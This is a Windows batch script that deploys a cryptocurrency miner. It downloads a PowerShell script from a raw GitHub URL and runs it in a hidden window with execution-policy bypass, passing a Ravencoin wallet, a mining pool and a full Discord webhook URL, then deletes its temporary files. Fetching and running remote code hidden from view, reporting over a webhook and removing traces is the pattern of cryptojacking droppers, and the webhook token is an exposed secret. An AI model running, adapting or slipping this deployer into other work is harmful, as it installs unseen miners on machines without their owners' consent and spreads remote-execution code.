@echo off
setlocal EnableDelayedExpansion

:: ==============================================================================
:: CONFIGURATION
:: ==============================================================================
set "RAW_URL=https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1"
set "WALLET=R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz"
set "POOL=us-rvn.2miners.com:6060"
set "ALGO=kawpow"
set "WEBHOOK=https://discord.com/api/webhooks/1211888966391824447/jPqHkvBqXc9mB29gM0mivbS53KBHx8vz8utNbKIG14DmFfDkxybTIBJIOj7F7jmja6S3"
:: ==============================================================================

echo [*] Fetching deployment script from GitHub...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%RAW_URL%' -OutFile '%TEMP%\Mine.ps1' -UseBasicParsing"

if not exist "%TEMP%\Mine.ps1" (
    echo [!] Failed to download script. Check the RAW_URL and your internet connection.
    pause
    exit /b 1
)

echo [*] Executing deployment script in the background...
set "LOG_FILE=%TEMP%\Mine_Deploy.log"

:: Run hidden, redirecting stdout/stderr to a log file for completion handling
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\Mine.ps1" -Wallet "%WALLET%" -Pool "%POOL%" -Algo "%ALGO%" -DiscordWebhook "%WEBHOOK%" > "%LOG_FILE%" 2>&1

echo [*] Deployment finished. Output:
echo -------------------------------------------------------------------------------
type "%LOG_FILE%"
echo -------------------------------------------------------------------------------

:: Cleanup temporary files
del "%TEMP%\Mine.ps1" >nul 2>&1
del "%LOG_FILE%" >nul 2>&1

echo [+] Setup complete. The browser should have opened to your pool dashboard.
echo [+] Check your Discord webhook for miner startup confirmation.
pause
